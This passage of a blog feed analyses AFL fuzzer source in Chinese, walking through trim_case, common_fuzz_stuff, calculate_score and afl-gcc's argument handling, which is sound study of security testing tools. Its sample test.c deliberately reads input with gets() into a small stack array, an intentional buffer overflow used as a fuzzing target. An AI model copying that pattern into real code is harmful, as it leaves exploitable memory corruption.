4}<ul><li>获取剩余大小，输出提示信息，更新当前阶段信息</li><li>循环每次前进 remove_len 直到整个文件被遍历完<ul><li>获取实际可裁剪长度，裁剪指定块</li><li>执行测试用例得到报错信息，增加执行裁剪次数计数器，如果用户中断或执行错误则跳转到 abort_trimming</li><li>计算裁剪后的校验和，和原来的校验和比较<ul><li>校验和相同，更新长度，计算下一个长度，更新内容，删除 remove_pos 向后的 remove_len 个字节，标记为需要修改，保存更新后的 trace_bits</li><li>校验和不同，说明裁剪后有影响则不裁剪，更新位置</li></ul></li><li>执行固定次数显示一次状态，更新 stage_cur</li></ul></li><li>块长度减半，继续下一轮裁剪</li></ul></li><li>如果标记为需要修改，删除原文件并且重新创建该文件，写入裁剪后的数据到新文件，更新 trace_bits 和位图分数</li><li>abort_trimming：记录裁剪后的总字节数，返回裁剪过程中发生的任何错误</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> u8 <span class="token function">trim_case</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">,</span> <span class="token keyword">struct</span> <span class="token class-name">queue_entry</span><span class="token operator">*</span> q<span class="token punctuation">,</span> u8<span class="token operator">*</span> in_buf<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">static</span> u8 tmp<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token keyword">static</span> u8 clean_trace<span class="token punctuation">[</span>MAP_SIZE<span class="token punctuation">]</span><span class="token punctuation">;</span>  u8  needs_write <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> fault <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  u32 trim_exec <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  u32 remove_len<span class="token punctuation">;</span>  u32 len_p2<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>q<span class="token operator">-></span>len <span class="token operator">&lt;</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">//长度小于 5 直接返回</span>  stage_name <span class="token operator">=</span> tmp<span class="token punctuation">;</span><span class="token comment">// 更新全局变量</span>  bytes_trim_in <span class="token operator">+=</span> q<span class="token operator">-></span>len<span class="token punctuation">;</span><span class="token comment">// 累计裁剪输入的字节数</span>  len_p2 <span class="token operator">=</span> <span class="token function">next_p2</span><span class="token punctuation">(</span>q<span class="token operator">-></span>len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//while (val > ret) ret &lt;&lt;= 1; 第一个大于等于 q->len 的 2 的次幂</span>  <span class="token comment">//TRIM_MIN_BYTES = 4TRIM_START_STEPS = 16 TRIM_END_STEPS = 1024</span>  remove_len <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>len_p2 <span class="token operator">/</span> TRIM_START_STEPS<span class="token punctuation">,</span> TRIM_MIN_BYTES<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//前进步长 max&#123;len_p2 / 16, 4&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span>remove_len <span class="token operator">>=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>len_p2 <span class="token operator">/</span> TRIM_END_STEPS<span class="token punctuation">,</span> TRIM_MIN_BYTES<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//剩余大小大于等于 max&#123;len_p2 / 1024 ,4&#125;</span>    u32 remove_pos <span class="token operator">=</span> remove_len<span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> <span class="token string">"trim %s/%s"</span><span class="token punctuation">,</span> <span class="token function">DI</span><span class="token punctuation">(</span>remove_len<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">DI</span><span class="token punctuation">(</span>remove_len<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    stage_cur <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    stage_max <span class="token operator">=</span> q<span class="token operator">-></span>len <span class="token operator">/</span> remove_len<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>remove_pos <span class="token operator">&lt;</span> q<span class="token operator">-></span>len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//每次前进remove_len个步长，直到整个文件都被遍历完为止</span>      u32 trim_avail <span class="token operator">=</span> <span class="token function">MIN</span><span class="token punctuation">(</span>remove_len<span class="token punctuation">,</span> q<span class="token operator">-></span>len <span class="token operator">-</span> remove_pos<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 实际可裁剪长度</span>      u32 cksum<span class="token punctuation">;</span>      <span class="token function">write_with_gap</span><span class="token punctuation">(</span>in_buf<span class="token punctuation">,</span> q<span class="token operator">-></span>len<span class="token punctuation">,</span> remove_pos<span class="token punctuation">,</span> trim_avail<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 裁剪指定块</span>      fault <span class="token operator">=</span> <span class="token function">run_target</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> exec_tmout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行测试用例得到报错信息</span>      trim_execs<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">//增加执行裁剪次数</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon <span class="token operator">||</span> fault <span class="token operator">==</span> FAULT_ERROR<span class="token punctuation">)</span> <span class="token keyword">goto</span> abort_trimming<span class="token punctuation">;</span><span class="token comment">//用户中断或执行错误则跳转到中断裁剪</span>      cksum <span class="token operator">=</span> <span class="token function">hash32</span><span class="token punctuation">(</span>trace_bits<span class="token punctuation">,</span> MAP_SIZE<span class="token punctuation">,</span> HASH_CONST<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//// 计算裁剪后的校验和</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>cksum <span class="token operator">==</span> q<span class="token operator">-></span>exec_cksum<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//和裁剪前的校验和相同则保留</span>        u32 move_tail <span class="token operator">=</span> q<span class="token operator">-></span>len <span class="token operator">-</span> remove_pos <span class="token operator">-</span> trim_avail<span class="token punctuation">;</span>        q<span class="token operator">-></span>len <span class="token operator">-=</span> trim_avail<span class="token punctuation">;</span><span class="token comment">//更新长度</span>        len_p2  <span class="token operator">=</span> <span class="token function">next_p2</span><span class="token punctuation">(</span>q<span class="token operator">-></span>len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//计算下一个长度</span>        <span class="token function">memmove</span><span class="token punctuation">(</span>in_buf <span class="token operator">+</span> remove_pos<span class="token punctuation">,</span> in_buf <span class="token operator">+</span> remove_pos <span class="token operator">+</span> trim_avail<span class="token punctuation">,</span> move_tail<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//更新内容，删除remove_pos向后的remove_len个字节</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>needs_write<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          needs_write <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//标记为需要修改</span>          <span class="token function">memcpy</span><span class="token punctuation">(</span>clean_trace<span class="token punctuation">,</span> trace_bits<span class="token punctuation">,</span> MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//保存更新后的 trace_bits</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> remove_pos <span class="token operator">+=</span> remove_len<span class="token punctuation">;</span><span class="token comment">//裁剪后有影响则不裁剪，更新位置</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>trim_exec<span class="token operator">++</span> <span class="token operator">%</span> stats_update_freq<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token function">show_stats</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行固定次数显示一次状态</span>      stage_cur<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    remove_len <span class="token operator">>>=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 块长度减半，继续下一轮裁剪。</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>needs_write<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果需要修改</span>    s32 fd<span class="token punctuation">;</span>    <span class="token function">unlink</span><span class="token punctuation">(</span>q<span class="token operator">-></span>fname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 删除原文件，忽略错误</span>    fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>q<span class="token operator">-></span>fname<span class="token punctuation">,</span> O_WRONLY <span class="token operator">|</span> O_CREAT <span class="token operator">|</span> O_EXCL<span class="token punctuation">,</span> <span class="token number">0600</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//重新创建文件</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>fd <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to create '%s'"</span><span class="token punctuation">,</span> q<span class="token operator">-></span>fname<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ck_write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> in_buf<span class="token punctuation">,</span> q<span class="token operator">-></span>len<span class="token punctuation">,</span> q<span class="token operator">-></span>fname<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//写入裁剪后的数据到新文件</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memcpy</span><span class="token punctuation">(</span>trace_bits<span class="token punctuation">,</span> clean_trace<span class="token punctuation">,</span> MAP_SIZE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//更新 trace_bits</span>    <span class="token function">update_bitmap_score</span><span class="token punctuation">(</span>q<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//更新位图分数</span>  <span class="token punctuation">&#125;</span>abort_trimming<span class="token operator">:</span>  bytes_trim_out <span class="token operator">+=</span> q<span class="token operator">-></span>len<span class="token punctuation">;</span><span class="token comment">// 记录裁剪后的总字节数</span>  <span class="token keyword">return</span> fault<span class="token punctuation">;</span><span class="token comment">// 返回裁剪过程中发生的任何错误</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="calculate-score"><a href="#calculate-score" class="headerlink" title="calculate_score"></a>calculate_score</h3><p>计算测试用例的性能得分，以调整 havoc 模糊测试的长度，跑得越快、覆盖度越高、深度越大，分数就会越高，在 havoc 阶段就会有更多资源来尝试变异</p><ul><li><p>计算平均时间、bitmap大小、设置初始 perf_score 为 100</p></li><li><p>read_testcases 时会调用 add_to_queue，此时所有的 input case 的 queue depth 都会被设置为 1</p></li><li><p>fuzz_one 时，会先设置 cur_depth 为当前 queue 的 depth，然后这个 queue 经过 mutate 之后调用 save_if_interesting,如果是 interesting case，就会被 add_to_queue，此时就建立起了 queue 之间的关联关系，所以由当前 queue 变异加入的新 queue，深度都在当前 queue 的基础上再增加</p></li></ul><h3 id="common-fuzz-stuff"><a href="#common-fuzz-stuff" class="headerlink" title="common_fuzz_stuff"></a>common_fuzz_stuff</h3><p>将变异出的用例写入 out_file 文件、调用 run_target  执行实验、调用 save_if_interesting() 以考虑将这个用例保存下来，如果连续超时就放弃这个测试用例</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">EXP_ST u8 <span class="token function">common_fuzz_stuff</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">,</span> u8<span class="token operator">*</span> out_buf<span class="token punctuation">,</span> u32 len<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8 fault<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>post_handler<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    out_buf <span class="token operator">=</span> <span class="token function">post_handler</span><span class="token punctuation">(</span>out_buf<span class="token punctuation">,</span> <span class="token operator">&amp;</span>len<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 如果存在后处理函数，则调用该函数处理输出缓冲区</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>out_buf <span class="token operator">||</span> <span class="token operator">!</span>len<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 如果处理后没有输出或长度为0，则直接返回0</span>  <span class="token punctuation">&#125;</span>  <span class="token function">write_to_testcase</span><span class="token punctuation">(</span>out_buf<span class="token punctuation">,</span> len<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将测试用例写入文件，准备运行</span>  fault <span class="token operator">=</span> <span class="token function">run_target</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> exec_tmout<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 运行被测程序，并记录运行结果（如崩溃、超时等）</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>stop_soon<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>fault <span class="token operator">==</span> FAULT_TMOUT<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>subseq_tmouts<span class="token operator">++</span> <span class="token operator">></span> TMOUT_LIMIT<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      cur_skipped_paths<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">// 记录连续超时的次数。如果连续超时次数过多，放弃这个测试用例</span>      <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> subseq_tmouts <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 如果不是超时，重置连续超时计数器</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>skip_requested<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// 如果收到跳过当前测试用例的请求，则重置请求标志，增加跳过路径计数，返回 1</span>     skip_requested <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>     cur_skipped_paths<span class="token operator">++</span><span class="token punctuation">;</span>     <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>      queued_discovered <span class="token operator">+=</span> <span class="token function">save_if_interesting</span><span class="token punctuation">(</span>argv<span class="token punctuation">,</span> out_buf<span class="token punctuation">,</span> len<span class="token punctuation">,</span> fault<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 调用 save_if_interesting 函数判断当前测试用例是否有趣（比如是否触发了新的代码路径或崩溃）</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>stage_cur <span class="token operator">%</span> stats_update_freq<span class="token punctuation">)</span> <span class="token operator">||</span> stage_cur <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">==</span> stage_max<span class="token punctuation">)</span>    <span class="token function">show_stats</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 每隔一定次数更新统计信息，或者在阶段结束时更新</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;perform-dry-run&quot;&gt;&lt;a href=&quot;#perform-dry-run&quot; class=&quot;headerlink&quot; title=&quot;perform_dry_run&quot;&gt;&lt;/a&gt;perform_dry_run&lt;/h3&gt;&lt;p&gt;执行所有的测试用例，以检查是否按预期</summary>
      
    
    
    
    <category term="fuzz" scheme="https://starrysky1004.github.io/categories/fuzz/"/>
    
    
    <category term="fuzz" scheme="https://starrysky1004.github.io/tags/fuzz/"/>
    
    <category term="AFL" scheme="https://starrysky1004.github.io/tags/AFL/"/>
    
  </entry>
  
  <entry>
    <title>AFL源码分析（一）</title>
    <link href="https://starrysky1004.github.io/2025/02/24/afl-yuan-ma-fen-xi-yi/afl-yuan-ma-fen-xi-yi/"/>
    <id>https://starrysky1004.github.io/2025/02/24/afl-yuan-ma-fen-xi-yi/afl-yuan-ma-fen-xi-yi/</id>
    <published>2025-02-24T07:25:16.000Z</published>
    <updated>2025-03-10T07:42:07.851Z</updated>
    
    <content type="html"><![CDATA[<h2 id="afl-gcc"><a href="#afl-gcc" class="headerlink" title="afl-gcc"></a>afl-gcc</h2><h3 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h3><p>test.c源码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token keyword">void</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">char</span><span class="token operator">*</span> a<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token function">gets</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>gdb载入源码调试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$gdb</span> <span class="token punctuation">..</span>/AFL/afl-gccpwndbg<span class="token operator">></span> <span class="token builtin class-name">set</span> args test.c <span class="token parameter variable">-o</span> <span class="token builtin class-name">test</span>pwndbg<span class="token operator">></span> <span class="token function">dir</span> <span class="token punctuation">..</span>/AFLpwndbg<span class="token operator">></span> b mainpwndbg<span class="token operator">></span> r<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><ul><li>输出版本信息</li><li>判断没有参数就退出</li><li>获取 afl-as 路径</li><li>调用 edit_params 解析参数</li><li>根据解析出的参数使用 execvp 执行 gcc</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span> argv<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isatty</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_QUIET"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//标准错误输出 stderr 定向到终端且 AFL_QUIET 环境变量不存在</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span>cCYA <span class="token string">"afl-cc "</span> cBRI VERSION cRST <span class="token string">" by &lt;lcamtuf@google.com>\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//输出 AFL 的版本信息</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> be_quiet <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">//如果标准错误输出 stderr 重定向到其他位置，或者 AFL_QUIET 环境变量存在，则设置 be_quiet = 1</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">&lt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//如果 afl-gcc 后面没有参数则输出报错后退出</span>    <span class="token function">SAYF</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span> BIN_PATH<span class="token punctuation">,</span> BIN_PATH<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">find_as</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//寻找 afl-as 的位置</span>  <span class="token function">edit_params</span><span class="token punctuation">(</span>argc<span class="token punctuation">,</span> argv<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析参数</span>  <span class="token function">execvp</span><span class="token punctuation">(</span>cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token operator">*</span><span class="token punctuation">)</span>cc_params<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//执行参数列表中的指令,通过 -B 指定使用 afl-as 进行汇编来编译插桩</span>  <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Oops, failed to execute '%s' - check your PATH"</span><span class="token punctuation">,</span> cc_params<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//解析失败报错</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="find-as"><a href="#find-as" class="headerlink" title="find_as"></a>find_as</h3><ul><li>通过环境变量中的 AFL_PATH 找 afl-as</li><li>如果没有就在 afl-gcc 所在目录里找 afl-as</li><li>再次去 AFL_PATH 中找 afl-as 找到就改成 AFL_PATH 中的 afl-as</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">find_as</span><span class="token punctuation">(</span>u8<span class="token operator">*</span> argv0<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  u8 <span class="token operator">*</span>afl_path <span class="token operator">=</span> <span class="token function">getenv</span><span class="token punctuation">(</span><span class="token string">"AFL_PATH"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取环境变量中的 AFL_PATH</span>  u8 <span class="token operator">*</span>slash<span class="token punctuation">,</span> <span class="token operator">*</span>tmp<span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>afl_path<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//环境变量中存在 AFL_PATH</span>    tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/as"</span><span class="token punctuation">,</span> afl_path<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// AFL_PATH / as 可访问</span>      as_path <span class="token operator">=</span> afl_path<span class="token punctuation">;</span><span class="token comment">// as_path 设置为环境变量中的 AFL_PATH</span>      <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  slash <span class="token operator">=</span> <span class="token function">strrchr</span><span class="token punctuation">(</span>argv0<span class="token punctuation">,</span> <span class="token char">'/'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//获取当前执行的 afl-gcc 程序路径字符串中“/”字符最后一次出现的位置,本例中"../AFL/afl-gcc"则指向"AFL/"后的"/"</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>slash<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    u8 <span class="token operator">*</span>dir<span class="token punctuation">;</span>    <span class="token operator">*</span>slash <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    dir <span class="token operator">=</span> <span class="token function">ck_strdup</span><span class="token punctuation">(</span>argv0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>slash <span class="token operator">=</span> <span class="token char">'/'</span><span class="token punctuation">;</span>    tmp <span class="token operator">=</span> <span class="token function">alloc_printf</span><span class="token punctuation">(</span><span class="token string">"%s/afl-as"</span><span class="token punctuation">,</span> dir<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//拼接成 ../AFL/afl-as</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>tmp<span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">// ../AFL/afl-as 可访问</span>      as_path <span class="token operator">=</span> dir<span class="token punctuation">;</span><span class="token comment">// as_path 设置为 ../AFL/afl-as</span>      <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token comment">//找到就返回</span>    <span class="token punctuation">&#125;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>tmp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ck_free</span><span class="token punctuation">(</span>dir<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">access</span><span class="token punctuation">(</span>AFL_PATH <span class="token string">"/as"</span><span class="token punctuation">,</span> X_OK<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">//第一次检查的时候可能是 NULL,再检查一遍 AFL_PATH / as 是否可访问</span>    as_path <span class="token operator">=</span> AFL_PATH<span class="token punctuation">;</span>    <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">FATAL</span><span class="token punctuation">(</span><span class="token string">"Unable to find AFL wrapper binary for 'as'. Please set AFL_PATH"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="edit-params"><a href="#edit-params" class="headerlink" title="edit_params"></a>edit_params</h3><p>处理 afl-fuzz 的参数，将参数存放到 cc_params[]</p><ul><li><p>根据 afl 指令选择对应的编译器存放到 cc_params[0]：afl-gcc &#x2F; afl-g++ &#x2F; afl-clang &#x2F; afl-clang++ &#x2F; afl-gcj &#x3D;&gt; gcc &#x2F; g++ &#x2F; clang &#x2F; clang++ &#x2F; gcj</p></li><li><p>循环解析参数并添加到参数列表数组中并设置相应的环境变量</p><ul><li><blockquote><ul><li>跳过 -B 后面的参数</li><li>跳过 -integrated-as 和 -pipe</li><li>-m32：设置 m32_set &#x3D; 1</li><li>存在 -fsanitize&#x3D;address  或 -fsanitize&#x3D;memory 设置 asan_set &#x3D; 1</li><li>存在 FORTIFY_SOURCE 设置 fortify_set &#x3D; 1</li></ul></blockquote></li><li><p>将当前参数存放到 cc_params 